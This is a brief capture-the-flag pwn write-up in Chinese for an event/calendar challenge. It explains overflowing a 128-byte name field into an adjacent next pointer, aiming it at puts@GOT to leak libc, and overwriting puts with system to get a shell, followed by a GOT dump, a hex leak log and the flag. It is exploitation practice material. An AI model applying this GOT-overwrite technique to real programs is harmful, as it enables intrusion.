# 思路
    char name[128];
    struct event *next;
名字长度256，有溢出，把next改为puts_got,泄漏libc，改puts为system
# debug
[0x404000] free@GLIBC_2.2.5 -> 0x401030 ◂— endbr64
[0x404008] puts@GLIBC_2.2.5 -> 0x7fafe759cbe0 (puts) ◂— endbr64
[0x404010] __stack_chk_fail@GLIBC_2.4 -> 0x401050 ◂— endbr64
[0x404018] setbuf@GLIBC_2.2.5 -> 0x7fafe75a4750 (setbuf) ◂— endbr64
[0x404020] printf@GLIBC_2.2.5 -> 0x7fafe7575100 (printf) ◂— endbr64
[0x404028] fgets@GLIBC_2.2.5 -> 0x7fafe759ab30 (fgets) ◂— endbr64
[0x404030] malloc@GLIBC_2.2.5 -> 0x7fafe75c2650 (malloc) ◂— endbr64
[0x404038] atoi@GLIBC_2.2.5 -> 0x7fafe755b660 (atoi) ◂— endbr64

[DEBUG] Received 0x47 bytes:
    00000000  33 38 38 31  34 32 31 37  39 32 3a 30  30 20 2d 20  │3881│4217│92:0│0 - │
    00000010  af 7f 0a 0a  0a 41 64 64  20 61 6e 20  65 76 65 6e  │····│·Add│ an │even│
    00000020  74 20 74 6f  20 79 6f 75  72 20 63 61  6c 65 6e 64  │t to│ you│r ca│lend│
    00000030  61 72 3a 0a  45 76 65 6e  74 20 74 69  6d 65 3f 20  │ar:·│Even│t ti│me? │
    00000040  28 31 2d 32  34 29 20                               │(1-2│4) │
    00000047
3881421792:00 - \xaf\x7f

# getshell
tjctf{i_h0pe_my_tre3s_ar3nt_b4d_too}
![](https://r2.20161023.xyz/pic/20250608025242617.png)